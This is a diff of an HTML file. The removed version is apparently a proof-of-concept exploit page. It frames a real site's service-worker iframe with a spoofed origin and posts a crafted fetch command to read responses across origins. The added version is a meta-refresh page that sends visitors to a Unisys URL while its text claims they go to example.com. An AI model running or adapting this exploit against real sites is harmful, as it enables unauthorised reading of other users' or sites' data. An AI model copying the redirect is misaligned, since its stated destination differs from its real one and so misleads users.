@@ -1,40 +1,12 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="5;url=https://gls-prod.ito.unisys.com/Cool-SSRC/sv.asp?category=WAD&service=Home&RADSSCN=SETTINGS&CAB=502&DRW=B&RPT=18&d=OK">
+    <title>Redirecting...</title>
+</head>
 <body>
-<h3>Output:</h3>
-<pre id="out">Waiting for SW to register (~3s)...</pre>
-<iframe id="sw" style="display:none"
-  src="https://jobs-pixal-web.ah.nl/_/service_worker/63b0/sw_iframe.html?origin=https://ihatedota.com&1p=1">
-</iframe>
-<script>
-const TARGET = 'https://jobs-pixal-web.ah.nl';
-const out = document.getElementById('out');
-
-window.addEventListener('message', e => {
-  if (e.origin === TARGET) {
-    out.textContent = JSON.stringify(e.data, null, 2);
-    console.log('SW response:', e.data);
-  }
-});
-
-document.getElementById('sw').addEventListener('load', () => {
-  setTimeout(() => {
-    out.textContent = 'SW ready — sending fetch command...';
-    document.getElementById('sw').contentWindow.postMessage({
-      clientId: '1',
-      type: 1,
-      command: {
-        commandType: 0,
-        params: {
-          url: TARGET + '/_/service_worker/63b0/sw.js',
-          method: 0,
-          processResponse: true,
-          templates: {}
-        }
-      }
-    }, TARGET);
-  }, 3000);
-});
-</script>
+    <h1>Redirecting...</h1>
+    <p>You will be redirected to example.com in 5 seconds.</p>
 </body>
 </html>
